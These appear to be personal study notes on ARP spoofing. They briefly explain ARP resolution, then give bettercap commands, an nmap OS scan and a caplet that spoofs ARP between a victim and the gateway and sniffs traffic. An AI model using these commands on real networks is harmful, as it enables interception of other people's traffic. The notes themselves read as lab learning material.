ARP Protocol
message go to router, bob will ask all devices whether they are the router(looking for an ip address), the router will say she is the router giving you the mac address (same thing will happen between first and second router...)

I can tell people in the network that I am the router giving them my mac address to become man in the middle

bettercap: (man in the middle)
sudo bettercap
net.probe on
net.show
192.168.1.5, 192.168.1.8, 192.168.1.9
now on another terminal:
  sudo nmap -O 192.168.1.5 (gather information of the connected device)

// TODO, this didn't work
sudo bettercap -iface eth0 -caplet arp.cap
// arp.cap
  net.probe on
  set arp.spoof.fullduplex true
  set arp.spoof.targets victim ip addr, geteway
  arp.spoof on
  set net.sniff.local true
  net.sniff on
